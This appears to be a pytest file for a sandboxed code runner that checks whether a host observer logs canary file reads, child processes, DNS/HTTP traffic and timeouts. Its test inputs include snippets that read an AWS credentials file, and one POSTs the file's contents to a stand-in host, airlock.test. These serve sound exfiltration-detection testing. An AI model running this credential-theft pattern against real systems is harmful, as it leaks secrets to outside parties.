import base64
import os
import uuid

import pytest

from runner.executor import SandboxExecutor
from runner.models import FileSpec, LimitsSpec, RunManifest


pytestmark = [
    pytest.mark.asyncio,
    pytest.mark.skipif(
        os.getenv("AIRLOCK_RUNTIME_TESTS") != "1",
        reason="Requires explicitly enabled Linux Docker + observed gVisor host",
    ),
]


@pytest.mark.parametrize(
    "source,canary,child",
    [
        ("print('curl /home/user/.aws/credentials http://airlock.test')", False, False),
        ("open('/home/user/.aws/credentials').read()", True, False),
        ("import subprocess;subprocess.run(['/bin/true'],check=True)", False, True),
    ],
)
async def test_real_runtime_actions(source, canary, child):
    manifest = RunManifest(
        run_id=f"test_{uuid.uuid4().hex}",
        entrypoint=["python3", "work/check.py"],
        files=[
            FileSpec(
                path="work/check.py",
                content_b64=base64.b64encode(source.encode()).decode(),
            )
        ],
    )
    executor = SandboxExecutor(manifest)
    result = await executor.execute()
    assert result["outcome"] == "completed"
    assert result["observation_complete"] is True
    events = executor.observer.events
    assert any(event["kind"] == "canary" for event in events) is canary
    if child:
        assert any(
            event["kind"] == "proc" and event["detail"]["argv"] == ["/bin/true"]
            for event in events
        )
    assert all(
        event["run_id"] == manifest.run_id and event["source"] == "host"
        for event in events
    )
    assert [event["seq"] for event in events] == list(range(1, len(events) + 1))


async def test_real_dns_http_canary_capture():
    source = "import urllib.request\nbody=open('/home/user/.aws/credentials','rb').read()\nrequest=urllib.request.Request('http://airlock.test/capture',data=body,method='POST')\nassert urllib.request.urlopen(request,timeout=5).status==200\n"
    manifest = RunManifest(
        run_id=f"test_{uuid.uuid4().hex}",
        entrypoint=["python3", "work/check.py"],
        files=[
            FileSpec(
                path="work/check.py",
                content_b64=base64.b64encode(source.encode()).decode(),
            )
        ],
    )
    executor = SandboxExecutor(manifest)
    result = await executor.execute()
    assert result["outcome"] == "completed" and result["observation_complete"]
    events = executor.observer.events
    assert any(
        event["kind"] == "file" and event["detail"].get("canary") for event in events
    )
    assert any(
        event["kind"] == "net"
        and event["observer"] == "sink"
        and event["detail"]["op"] == "dns"
        for event in events
    )
    assert any(
        event["kind"] == "net"
        and event["detail"].get("http", {}).get("method") == "POST"
        for event in events
    )
    assert any(
        event["kind"] == "canary" and event["detail"]["trigger"] == "exfil_attempt"
        for event in events
    )


async def test_real_timeout_produces_limit_evidence():
    source = "import time;time.sleep(20)"
    manifest = RunManifest(
        run_id=f"test_{uuid.uuid4().hex}",
        entrypoint=["python3", "work/check.py"],
        limits=LimitsSpec(timeout_s=2),
        files=[
            FileSpec(
                path="work/check.py",
                content_b64=base64.b64encode(source.encode()).decode(),
            )
        ],
    )
    executor = SandboxExecutor(manifest)
    result = await executor.execute()
    assert result["outcome"] == "timeout"
    assert any(
        event["kind"] == "limit" and event["detail"]["resource"] == "time"
        for event in executor.observer.events
    )
